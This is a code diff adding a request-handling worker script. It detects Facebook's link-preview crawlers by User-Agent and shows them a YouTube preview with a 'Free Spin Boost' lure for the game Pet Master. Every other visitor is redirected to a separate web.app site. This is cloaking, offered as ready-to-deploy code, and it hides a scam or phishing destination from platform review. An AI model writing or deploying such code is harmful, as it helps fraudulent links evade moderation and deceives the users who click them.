@@ -1,0 +1,47 @@
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request));
+});
+
+async function handleRequest(request) {
+  const userAgent = request.headers.get('User-Agent') || '';
+
+  // Regular expression to match Facebook bots
+  const facebookBotPattern = /facebook(?:externalhit|platform|bot)/i;
+
+  // URLs to use for Facebook bots and normal usersc
+  const youtubeURL = 'https://www.youtube.com/watch?v=HdmeL370h5o&ab_channel=xxcxc';
+  const normalUserURL = 'https://petmas999.web.app';
+
+  // Custom GIF URL for the thumbnail
+  const customGifURL = 'https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjZjeHV6enczOXduODh5ZGY1bHZ1ZXZ0dHM2ZW1yZWpxcHN4MHptMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/5bfxyKviqZmBHW0dYS/giphy.gif';
+
+  // Check if the request comes from Facebook bot
+  if (facebookBotPattern.test(userAgent)) {
+    // HTML response for Facebook bots with Open Graph meta tags
+    const htmlResponse = `
+      <!DOCTYPE html>
+      <html>
+      <head>
+        <meta property="og:title" content="Pet Master its a sure bet that will give you a Free Spin Boost !!🐸💚" />
+        <meta property="og:type" content="video.other" />
+        <meta property="og:url" content="${youtubeURL}" />
+        <meta property="og:image" content="${customGifURL}" />
+        <meta property="og:description" content="Pet Master its a sure bet that will give you a Free Spin Boost !!🐸💚" />
+        <meta property="og:site_name" content="Pet Master its a sure bet that will give you a Free Spin Boost !!🐸💚" />
+      </head>
+      <body>
+        <h1>Pet Master its a sure bet that will give you a Free Spin Boost !!🐸💚</h1>
+        <p>Click <a href="${youtubeURL}">${youtubeURL}</a> to view the full details and claim your offer.watch the video for details! </p>
+        <p>Share this link: <strong>${youtubeURL}</strong></p>
+        <img src="${customGifURL}" alt="Enchanted Chips Offer" />
+      </body>
+      </html>
+    `;
+    return new Response(htmlResponse, {
+      headers: { 'Content-Type': 'text/html' },
+    });
+  }
+
+  // For normal users, redirect to the regular URL
+  return Response.redirect(normalUserURL, 302);
+}
